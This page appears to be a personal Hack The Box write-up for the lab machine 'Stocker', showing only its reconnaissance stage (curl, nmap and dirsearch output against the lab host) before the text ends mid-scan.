<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Support" href="../support/support.html" /><link rel="prev" title="Soccer" href="../soccer/soccer.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Stocker - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../medium/administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../easy.html">Easy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="stocker.png" src="../../../../_images/stocker.png" /></p>
<section id="stocker">
<h1>Stocker<a class="headerlink" href="#stocker" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://10.129.136.11
HTTP/1.1<span class="w"> </span><span class="m">301</span><span class="w"> </span>Moved<span class="w"> </span>Permanently
Server:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
Date:<span class="w"> </span>Wed,<span class="w"> </span><span class="m">18</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">08</span>:38:10<span class="w"> </span>GMT
Content-Type:<span class="w"> </span>text/html
Content-Length:<span class="w"> </span><span class="m">178</span>
Connection:<span class="w"> </span>keep-alive
Location:<span class="w"> </span>http://stocker.htb

&lt;html&gt;
&lt;head&gt;&lt;title&gt;301<span class="w"> </span>Moved<span class="w"> </span>Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301<span class="w"> </span>Moved<span class="w"> </span>Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></div>
</div>
<p>Adding stocker.htb to the hosts file and starting vhost enumeration -&gt; no findings</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>scans/nmap.initial
<span class="c1"># Nmap 7.93 scan initiated Sun Jan 15 22:13:24 2023 as: nmap -sC -sV -oN scans/nmap.initial 10.129.136.11</span>
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>stocker.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.136.11<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.064s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.5<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>3d12971d86bc161683608f4f06e6d54e<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>7c4d1a7868ce1200df491037f9ad174f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>dd978050a5bacd7d55e827ed28fdaa3b<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-generator:<span class="w"> </span>Eleventy<span class="w"> </span>v2.0.0
<span class="p">|</span>_http-title:<span class="w"> </span>Stock<span class="w"> </span>-<span class="w"> </span>Coming<span class="w"> </span>Soon!
<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
<span class="c1"># Nmap done at Sun Jan 15 22:13:34 2023 -- 1 IP address (1 host up) scanned in 9.76 seconds</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://stocker.htb

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/stocker.htb/_23-01-15_22-30-30.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-01-15_22-30-30.log

Target:<span class="w"> </span>http://stocker.htb/

<span class="o">[</span><span class="m">22</span>:30:30<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">22</span>:30:31<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>178B<span class="w">  </span>-<span class="w"> </span>/js<span class="w">  </span>-&gt;<span class="w">  </span>http://stocker.htb/js/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:30:49<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>178B<span class="w">  </span>-<span class="w"> </span>/css<span class="w">  </span>-&gt;<span class="w">  </span>http://stocker.htb/css/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:30:51<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/favicon.ico
<span class="o">[</span><span class="m">22</span>:30:52<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>178B<span class="w">  </span>-<span class="w"> </span>/fonts<span class="w">  </span>-&gt;<span class="w">  </span>http://stocker.htb/fonts/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:30:53<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>178B<span class="w">  </span>-<span class="w"> </span>/img<span class="w">  </span>-&gt;<span class="w">  </span>http://stocker.htb/img/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:30:53<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>15KB<span class="w"> </span>-<span class="w"> </span>/index.html
<span class="o">[</span><span class="m">22</span>:30:54<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>564B<span class="w">  </span>-<span class="w"> </span>/js/
